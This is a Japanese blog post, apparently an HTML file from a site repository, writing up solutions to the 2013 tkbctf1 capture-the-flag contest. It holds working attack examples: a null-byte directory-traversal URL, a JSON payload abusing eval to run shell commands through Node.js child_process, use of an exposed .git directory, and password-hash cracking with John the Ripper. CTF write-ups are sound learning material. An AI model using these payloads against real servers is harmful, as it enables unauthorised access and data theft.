@@ -1,0 +1,1791 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+
+  
+
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.26 with theme Tranquilpeak 0.4.1-BETA">
+    <title>tkbctf1 writeup</title>
+    <meta name="author" content="Kazutoshi Noguchi">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="https://ngkz.github.io/favicon.png">
+    
+
+    
+    <meta name="description" content="2013/5/4〜5/5のtkbctf1に参加しました。
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Scoreboard
+  
+
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Challenges
+  
+
+
+
+個人ランキングで1位でした。
+
+">
+    <meta property="og:description" content="2013/5/4〜5/5のtkbctf1に参加しました。
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Scoreboard
+  
+
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Challenges
+  
+
+
+
+個人ランキングで1位でした。
+
+">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="tkbctf1 writeup">
+    <meta property="og:url" content="/2014/01/tkbctf1-writeup/">
+    <meta property="og:site_name" content="ngkz.log">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="ngkz.log">
+    <meta name="twitter:description" content="2013/5/4〜5/5のtkbctf1に参加しました。
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Scoreboard
+  
+
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+
+  
+    
+  
+    
+  
+    
+  
+   
+    Challenges
+  
+
+
+
+個人ランキングで1位でした。
+
+">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="https://ngkz.github.io/mypicture.jpg">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://ngkz.github.io/css/style-fpbzgxsy0kgmdvyrj5ykkg6ratccrk3gocmaqn4xpcjywmv5dteilzucro4f.min.css" />
+    
+    
+
+    
+      
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-106134104-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="1">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://ngkz.github.io/">ngkz.log</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://ngkz.github.io/page/profile/">
+    
+    
+    
+      
+        <img class="header-picture" src="https://ngkz.github.io/mypicture.jpg" alt="著者の絵" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="1">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://ngkz.github.io/page/profile/">
+          <img class="sidebar-profile-picture" src="https://ngkz.github.io/mypicture.jpg" alt="著者の絵" />
+        </a>
+        <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
+        
+          <h5 class="sidebar-profile-bio">TODO</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">ホーム</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">カテゴリー</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">タグ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">アーカイブ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/page/profile/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">プロフィール</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/ngkz" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="1"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      tkbctf1 writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2014-01-29T13:06:30&#43;09:00">
+        
+  
+  
+  
+  
+    2014-01-29
+  
+
+      </time>
+    
+    
+  
+  
+    <span>カテゴリー</span>
+    
+      <a class="category-link" href="https://ngkz.github.io/categories/ctf">CTF</a>, 
+    
+      <a class="category-link" href="https://ngkz.github.io/categories/writeup">writeup</a>
+    
+  
+
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>2013/5/4〜5/5の<a href="http://tkbctf.info/tkbctf1">tkbctf1</a>に参加しました。</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png" title="Scoreboard" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png"  alt="Scoreboard">
+  
+    </a>
+  
+   
+    <span class="caption">Scoreboard</span>
+  
+</div>
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png" title="Challenges" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png"  alt="Challenges">
+  
+    </a>
+  
+   
+    <span class="caption">Challenges</span>
+  
+</div>
+
+
+<p>個人ランキングで1位でした。</p>
+
+<p></p>
+
+<h2 id="問題">問題</h2>
+
+<h3 id="who-are-you-bin-100">Who are you? (Bin 100)</h3>
+
+<p>リバースエンジニアリングの問題</p>
+
+<p></p>
+
+<pre><code>[BEGINNER]
+
+http://**/9a000ac8313f9179c4b057f56d27061430f4ed1e
+</code></pre>
+
+<p></p>
+
+<p>$ file 9a000ac8313f9179c4b057f56d27061430f4ed1e</p>
+
+<pre><code>9a000ac8313f9179c4b057f56d27061430f4ed1e: PE32 executable (console) Intel 80386, for MS Windows
+</code></pre>
+
+<p></p>
+
+<p>入力した文字列と、デコードしたデータを比較するプログラム。</p>
+
+<p>デバッガで動作を追うとすぐに答えが分かる。</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/6f23314b8f198a132aad58b934088dfd.png" title="Screenshot" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/6f23314b8f198a132aad58b934088dfd.png"  alt="Screenshot">
+  
+    </a>
+  
+   
+    <span class="caption">Screenshot</span>
+  
+</div>
+
+
+<p></p>
+
+<p>Flagは「I&rsquo;m a CTF player!!!」</p>
+
+<p></p>
+
+<p>途中までデバッガを使わずに解析していたため、問題と解くのに時間がかかってしまった。</p>
+
+<h3 id="happy-birthday-misc-100">Happy Birthday (Misc 100)</h3>
+
+<pre><code>When did linux born? format: +%Y/%m/%d
+</code></pre>
+
+<p></p>
+
+<p>Flagは Linux 0.01のリリース日の 1991/09/17</p>
+
+<h3 id="slyr-forensic-100">slyr (Forensic 100)</h3>
+
+<p>クラッシュダンプを解析する問題</p>
+
+<p></p>
+
+<pre><code>[BEGINNER]
+
+What is he looking for?
+http://**/815B0B857EBF8AAED75E4232E0B60353C0B3C084
+</code></pre>
+
+<p></p>
+
+<p>$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084 </p>
+
+<pre><code>815B0B857EBF8AAED75E4232E0B60353C0B3C084: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p></p>
+
+<p>$ file 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded</p>
+
+<pre><code>815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded: MDMP crash report data
+</code></pre>
+
+<p></p>
+
+<p>$ strings 815B0B857EBF8AAED75E4232E0B60353C0B3C084.expanded</p>
+
+<pre><code>...
+u~Visited: Bob@http://www.google.com/search?hl=ja&amp;source=hp&amp;q=Windows+Vista+codename&amp;gbv=2&amp;oq=Windows+Vista+codename&amp;gs_l=heirloom-hp.3..0i19j0i30i19j0i8i30i19l3.1282.4737.0.5448.26.19.2.5.5.0.120.1413.17j2.19.0...0.0...1ac.1.12.heirloom-hp.yt3DHbaT1k4...
+</code></pre>
+
+<p></p>
+
+<p>クラッシュダンプの文字列を見ると、 問題のファイルは Internet
+Explorerのクラッシュダンプで、 Windows
+Vistaのコードネームについて調べていることが分かる。</p>
+
+<p>Flagは、Windows Vistaのコードネームの「Longhorn」。</p>
+
+<h3 id="blue-web-100">blue (Web 100)</h3>
+
+<p>Null Byte Injectionとディレクトリトラバーサルの問題</p>
+
+<p></p>
+
+<pre><code>Find the flag.
+
+http://10.39.0.2/manual.php?page=sl
+</code></pre>
+
+<p></p>
+
+<p>pageパラメータに渡された文字列から、「../」を取り除き、後に「.txt」をつけて、ファイルを読み込むプログラム。</p>
+
+<p>NULL バイトから後が無視されるため、pageパラメータの最後にNULLをつけることで、 任意のファイルを読み込めてしまう。</p>
+
+<p><a href="http://10.39.0.2/manual.php?page=//home/blue/flag%00">http://10.39.0.2/manual.php?page=//home/blue/flag%00</a></p>
+
+<p>Flagは「DIR_TR@VERS@L」</p>
+
+<h3 id="diva-bin-200">Diva (Bin 200)</h3>
+
+<p>ミク算</p>
+
+<p></p>
+
+<pre><code>[INTERMEDIATE]
+http://**/82C9DC2D2D3DF1635483D84B7A53FF0B8A80C37C
+
+正しいフラグは32文字です。 手違いで長すぎる物も通る状態で出してしまいました。もし32文字以下で正しい回答を得られた場合、**@**までフラグを連絡して下さい。 
+strlen(RIGHT_FLAG) = 32. If you got right answer with input less than 32 characters long, please send email to **@** with your flag.
+</code></pre>
+
+<p></p>
+
+<pre><code>9 (57) : 87li  8*7+1   = 57
+3 (51) : u6s   57-6    = 51
+e (101): u2le  51*2-1  = 101
+n (110): u9a   101+9   = 110
+2 (50) : u2d5s 110/2-5 = 50
+a (97) : u2l3s 50*2-3  = 97
+h (104): u7a   97 + 7  = 104
+</code></pre>
+
+<p></p>
+
+<pre><code>Press Enter key without any inputs to exit.
+&gt; 87liu6su2leu9au2d5su2l3su7a
+ha2ne39
+A.Conguratulations! Send your input: 87liu6su2leu9au2d5su2l3su7a
+</code></pre>
+
+<p></p>
+
+<p>問題作成者の解説:  <a href="https://web.archive.org/web/20140109071212/https://aquarite.info/2013/05/tkbctf1-diva/">tkbctf1: Diva</a></p>
+
+<p>答えは「87liu6su2leu9au2d5su2l3su7a」</p>
+
+<p>複数解が存在する</p>
+
+<p>コードを読むのが辛くて、解いた後頭が痛くなった。</p>
+
+<h3 id="my-favorite-things-forensic-400">My favorite Things (Forensic 400)</h3>
+
+<p>しゃけ！</p>
+
+<p>解けた人が1人しかいなかったせいか、途中にヒントが追加されて、それに伴い350→300点と点数が下がっていった。</p>
+
+<p></p>
+
+<pre><code>This fragged disk image contains emotional message. Do you know my favorite? It's answer.
+http://**/56e6a4288ba1196b98824564fe4b98d3a5d17984
+
+Hint1: Tanks are dummy, some images are duplicated.
+Hint2: Shake!
+</code></pre>
+
+<p></p>
+
+<p>解けなかった。</p>
+
+<p>問題文のファイルは、 ディレクトリエントリ一部と、データ領域を含む FATファイルシステムの断片</p>
+
+<p></p>
+
+<pre><code>DE: name:FRAGGED    , attribute:8 reserved:0 createTimeMs:0:0:0 createTime:0:0:0 createDate:1980/0/0, accessDate:1980/0/0 cluster:0, updateTime5:33:104 updateDate:2013/5/3 fileSize:0
+LFN: deleted:0, continues:64, seq:1, name:imoviewer.apk attribute: 15, reserved:0, checkCode:192, cluster:0
+DE: name:IMOVIE~1APK, attribute:32 reserved:0 createTimeMs:0:2:44 createTime:5:36:28 createDate:2013/5/3, accessDate:2013/5/3 cluster:69250, updateTime5:35:48 updateDate:2013/5/3 fileSize:6161171
+DE: name:GREEN   BMP, attribute:32 reserved:24 createTimeMs:0:1:68 createTime:5:40:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:3, updateTime5:40:112 updateDate:2013/5/3 fileSize:5760054
+DE: name:GRAY    GIF, attribute:32 reserved:24 createTimeMs:0:1:124 createTime:5:45:24 createDate:2013/5/3, accessDate:2013/5/3 cluster:11254, updateTime5:44:68 updateDate:2013/5/3 fileSize:144927
+DE: name:RED     BMP, attribute:32 reserved:24 createTimeMs:0:0:116 createTime:5:45:32 createDate:2013/5/3, accessDate:2013/5/3 cluster:75106, updateTime5:41:0 updateDate:2013/5/3 fileSize:5760054
+DE: name:BLUE    BMP, attribute:32 reserved:24 createTimeMs:0:0:24 createTime:5:45:40 createDate:2013/5/3, accessDate:2013/5/3 cluster:44245, updateTime5:41:24 updateDate:2013/5/3 fileSize:5760054
+DE: name:TYPE90  JPG, attribute:32 reserved:24 createTimeMs:0:2:84 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:55496, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
+DE: name:TYPE97  JPG, attribute:32 reserved:24 createTimeMs:0:2:88 createTime:5:49:48 createDate:2013/5/3, accessDate:2013/5/3 cluster:60149, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
+LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:189, cluster:0
+LFN: deleted:0, continues:0, seq:1, name:type90 - コピー. attribute: 15, reserved:0, checkCode:189, cluster:0
+DE: name:TYPE90~1JPG, attribute:32 reserved:0 createTimeMs:0:0:104 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:62168, updateTime5:47:92 updateDate:2013/5/3 fileSize:1664984
+LFN: deleted:0, continues:64, seq:2, name:jpg attribute: 15, reserved:0, checkCode:37, cluster:0
+LFN: deleted:0, continues:0, seq:1, name:type97 - コピー. attribute: 15, reserved:0, checkCode:37, cluster:0
+DE: name:TYPE97~1JPG, attribute:32 reserved:0 createTimeMs:0:0:108 createTime:5:49:60 createDate:2013/5/3, accessDate:2013/5/3 cluster:11538, updateTime5:48:80 updateDate:2013/5/3 fileSize:1033239
+LFN: deleted:0, continues:64, seq:2, name:(2).jpg attribute: 15, reserved:0, checkCode:29, cluster:0
+</code></pre>
+
+<p></p>
+
+<p>ディスクイメージからapkを取り出すことが出来なかった。</p>
+
+<h3 id="good-old-days-bin-300">Good Old Days (Bin 300)</h3>
+
+<p>リバースエンジニアリングの問題</p>
+
+<p></p>
+
+<pre><code>[ADVANCED]
+I need the &quot;Message&quot; to continue my game but I forgot the secret command!!!
+Can you get the &quot;Message&quot;? I remember that the &quot;Message&quot; was alphanumeric characters.
+http://**/cb0c3d0f55b9b627b831f4fbbc153846
+</code></pre>
+
+<p></p>
+
+<p>$ file cb0c3d0f55b9b627b831f4fbbc153846</p>
+
+<pre><code>cb0c3d0f55b9b627b831f4fbbc153846: iNES ROM dump, 2x16k PRG, 1x8k CHR, [Vert.], [SRAM]
+</code></pre>
+
+<p></p>
+
+<p>問題文のファイルはファミコンのROM。</p>
+
+<p>←↓↑→ABのどれかのキーを8回入力すると、8文字のメッセージが表示される。</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/df5efc6331016d8e552c2fa6d1d7332d.png" title="Screenshot" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/df5efc6331016d8e552c2fa6d1d7332d.png"  alt="Screenshot">
+  
+    </a>
+  
+   
+    <span class="caption">Screenshot</span>
+  
+</div>
+
+
+<p></p>
+
+<p>メモリビューワを使うと キーを押すと アドレス
+0x6000-0x6007が順に変化していくがわかる。</p>
+
+<p>そこで、そこに書き込みブレークポイントを仕掛ける。</p>
+
+<p>キーを押して動作を調べていくと、</p>
+
+<p>A: 0x36でXOR <br />
+B: 0x5cでXOR <br />
+↑: 0xc9でXOR <br />
+↓: 0xa3でXOR <br />
+→: 右ローテート <br />
+←: 左ローテート</p>
+
+<p>であることががわかる。</p>
+
+<p></p>
+
+<pre><code>#!/usr/bin/python
+operators = (
+    (&quot;A&quot;,     lambda x: x ^ 0x36),
+    (&quot;B&quot;,     lambda x: x ^ 0x5c),
+    (&quot;UP&quot;,    lambda x: x ^ 0xc9),
+    (&quot;DOWN&quot;,  lambda x: x ^ 0xa3),
+    (&quot;RIGHT&quot;, lambda x: (x &gt;&gt; 1) | ((x &amp; 1) &lt;&lt; 7)), #rotate right
+    (&quot;LEFT&quot;,  lambda x: ((x &lt;&lt; 1) &amp; 0xff) | ((x &amp; 0x80) &gt;&gt; 7)), #rotate left
+)
+values = (0xBE, 0x60, 0xA4, 0xA5, 0x88, 0x64, 0x03, 0x6A)
+for x in values:
+    out = []
+    for op, action in operators:
+        y = action(x)
+        if chr(y).isalnum():
+            out.append(chr(y))
+    print out
+</code></pre>
+
+<p></p>
+
+<pre><code>$ python solve.py
+['w']
+['V', '0']
+['m', 'R', 'I']
+['l', 'K']
+['A', 'D']
+['R', '8', '2']
+['5']
+['6', '5']
+</code></pre>
+
+<p></p>
+
+<p>出力が英数字になるパターンが何個かあるが、</p>
+
+<p>意味のある文字列の「w0RlD256」が答え。</p>
+
+<h3 id="are-these-your-grades-web-400">Are these your grades? (Web 400)</h3>
+
+<p>SQLインジェクションの問題</p>
+
+<p></p>
+
+<pre><code>こんにちは。博麗大学のS.Iと申します。
+春休みに入り成績が付いたのですが、どうも線形代数Iの成績が芳しくないのです。これを落とすとたいへんなことになってしまいます。
+線形代数にF(落第点)が付いているのですが、これをD(及第点ギリギリ)に書き換えてくださいませんか?
+わたしのログイン情報は 13413983:f.scarlet495 なので、ご参考まで。
+どうかお力添えをお願いします。
+
+Greetings. I'm S.I at University of Hakurei.
+I'm very anxious about my grades, especially Linear Algebra I.
+It's about time for professors to grade us on their Online Grading System, however, I've failed the Linear Algebra I class which is a big trouble.
+Can you hack into it and grade me &quot;D&quot; for Linear Algebra I instead of an &quot;F&quot;?
+Here's my login information: 13413983:f.scarlet495
+I appreciate your help.
+
+--- このCTFミッションは、WIDEプロジェクト (http://www.wide.ad.jp) 提供のネットワークにて公開しております。所在地: 筑波大学3F棟230号室 産学間連携推進室 ---
+--- This CTF Mission is provided via Tsukuba WIDE (http://www.wide.ad.jp), at 3F230, University of Tsukuba. ---
+http://**/
+</code></pre>
+
+<p>邪道な方法で解いた。</p>
+
+<p>/.git ディレクトリに外部からアクセスできる状態になっていたので、/.git/indexをダウンロードしてファイルの一覧を得る。</p>
+
+<p>$ strings index</p>
+
+<pre><code>DIRC
+6b}Z
+etc/config.yml
+index.pl
+lib/CTF/Grades.pm
+lib/CTF/Login.pm
+lib/CTF/Template.pm
+uQ{qx
+lib/scripts/grades.pl
+lib/scripts/login.pl
+xh`A
+lib/scripts/menu.pl
+lib/scripts/subjects.pl
+templates/LICENSE.txt
+templates/footer.tt
+templates/gpl.txt
+templates/grades.tt
+templates/grades_editable.tt
+P9&amp;U
+templates/header.tt
+templates/main.tt
+#MhE
+templates/not_logged_in.tt
+templates/style.css
+templates/subjects.tt
+TREE
+19 3
+i&gt;fAt\etc
++XfG@
+[$]lib
+scripts
+U: E)&gt;
+templates
+10 0
+</code></pre>
+
+<p>/etc/config.ymlにFLAGが書いてある。</p>
+
+<p>FLAG: 忘れた</p>
+
+<p>問題作成者の解説: <a href="https://web.archive.org/web/20170920022611/https://x86-64.jp/blog/tkbctf1-are-these-your-grades">第1回tkbctf 問題「Are these your grades?」を作ってみた</a></p>
+
+<h3 id="fairy-misc-200">fairy (Misc 200)</h3>
+
+<pre><code>We need to access a thin client to get trade secret of rival company.
+However the client needs to be unlocked at boot sequence. Can you unlock?
+This file may help you.
+http://**/250d3a31dee7f62d57ea3d17f544b5e4750e8039
+</code></pre>
+
+<p></p>
+
+<pre><code>$ file 250d3a31dee7f62d57ea3d17f544b5e4750e8039 
+250d3a31dee7f62d57ea3d17f544b5e4750e8039: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
+</code></pre>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/ae5200b836564e01fc6b87f382440418.png" title="TFTP packets" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/ae5200b836564e01fc6b87f382440418.png"  alt="TFTP packets">
+  
+    </a>
+  
+   
+    <span class="caption">TFTP packets</span>
+  
+</div>
+
+
+<p>問題文のファイルは、PXEブートのパケットキャプチャです。</p>
+
+<p>そこからアンロックに必要な情報を抜き取る。</p>
+
+<p>strings でキャプチャファイルを覗くと パスワードのハッシュが得られる。</p>
+
+<pre><code>default menu.c32
+label debian
+        menu passwd $4$OVtcFw7z$9S2RpE0jMdbV1Z/+daXh2RGQtDM$
+        kernel linux
+        append initrd=initrd.gz
+</code></pre>
+
+<p><br />
+このパスワードハッシュは sha1pass
+スクリプトで生成されたもので、以下のような形式になっています。</p>
+
+<pre><code>'$4$' + salt + '$' + BASE64(SHA1(salt + password)) + '$'
+</code></pre>
+
+<p>John the
+Ripperはこの形式のハッシュに対応していないので、Johnがサポートしている
+sha1-gen形式に変換する。</p>
+
+<p></p>
+
+<p>$ echo &ldquo;9S2RpE0jMdbV1Z/+daXh2RGQtDM&rdquo; | base64 -d | xxd -p</p>
+
+<pre><code>f52d91a44d2331d6d5d59ffe75a5e1d91190b433
+</code></pre>
+
+<p></p>
+
+<p>$ echo &ldquo;$SHA1p$OVtcFw7z$f52d91a44d2331d6d5d59ffe75a5e1d91190b433&rdquo; &gt; boot-passwd</p>
+
+<p>$ john &ndash;show  &ndash;format=sha1-gen boot-passwd </p>
+
+<pre><code>?:goodluck
+1 password hash cracked, 0 left
+</code></pre>
+
+<p></p>
+
+<p>Flagは「goodluck」</p>
+
+<h3 id="what-is-this-web-200">What is this? (Web 200)</h3>
+
+<pre><code>This runs in user 'commando'. http://10.39.0.5/servinfo.html
+</code></pre>
+
+<p>servinfo.htmlでは、一定時間ごとに /info へJSONをpostして</p>
+
+<ul>
+<li>時刻</li>
+<li>実行中のプロセスの数</li>
+<li>Load Average</li>
+</ul>
+
+<p>の3つの情報を取得して表示している。</p>
+
+<pre><code>{&quot;info&quot;: &quot;time&quot;}
+</code></pre>
+
+<p>evalで入力をパースしているため、以下のように細工したJSONを送信することで、任意のコードを実行できてしまう。</p>
+
+<pre><code>{&quot;info&quot;: function() {
+  var orig = Date.prototype.getTime;
+  Date.prototype.getTime = function() {
+    var util = require('util');
+    var exec = require('child_process').exec;
+    function a(error, stdout, stderr) {
+      GLOBAL.__stdout = stdout;
+      GLOBAL.__stderr = stderr;
+    }
+    exec(&quot;cat /home/commado/flag&quot;, a);
+    return [GLOBAL.__stdout, GLOBAL.__stderr];
+  };
+  process.nextTick(function() { Date.prototype.getTime = orig; });
+  return &quot;time&quot;;
+}()}
+</code></pre>
+
+<p>Flagは「MACHOMAN」</p>
+
+<p>最初はflagのパーミッションが間違っていて、rootしか読めないようになってしまっていたが
+修正された。</p>
+
+<h3 id="who-wrote-this-misc-300">Who wrote this? (Misc 300)</h3>
+
+<pre><code>http://**/581cf9b214c109556fbb3cf74094dcded66baa17
+</code></pre>
+
+<p>解けなかった。</p>
+
+<p>$ file 581cf9b214c109556fbb3cf74094dcded66baa17</p>
+
+<pre><code>581cf9b214c109556fbb3cf74094dcded66baa17: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
+</code></pre>
+
+<p>問題文のファイルを展開すると、ELFファイルが出てくる。</p>
+
+<pre><code>08048374 &lt;main&gt;:
+ 8048374:       3c 03                   cmp    $0x3,%al
+ 8048376:       3c 08                   cmp    $0x8,%al
+ 8048378:       3c 05                   cmp    $0x5,%al
+ 804837a:       b7 08                   mov    $0x8,%bh
+ 804837c:       3c 07                   cmp    $0x7,%al
+ 804837e:       04 09                   add    $0x9,%al
+ 8048380:       04 09                   add    $0x9,%al
+ 8048382:       b7 08                   mov    $0x8,%bh
+ 8048384:       2c 0a                   sub    $0xa,%al
+ 8048386:       b0 08                   mov    $0x8,%al
+ 8048388:       2c 0b                   sub    $0xb,%al
+ 804838a:       3c 08                   cmp    $0x8,%al
+ 804838c:       b7 0b                   mov    $0xb,%bh
+ 804838e:       04 08                   add    $0x8,%al
+ 8048390:       2c 0c                   sub    $0xc,%al
+ 8048392:       3c 07                   cmp    $0x7,%al
+ 8048394:       1c 0c                   sbb    $0xc,%al
+</code></pre>
+
+<p>実行してもなにも起こらないコード</p>
+
+<p>バイナリエディタで見てもよく分からなかった。</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">タグ</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://ngkz.github.io//tags/tkbctf/">tkbctf</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2012-finals/" data-tooltip="SECCON CTF 2012 全国大会で優勝しました。">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">次</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/newyearsctf/" data-tooltip="年越しCTF x86-64.jp大会 2014で優勝しました。">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">前</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
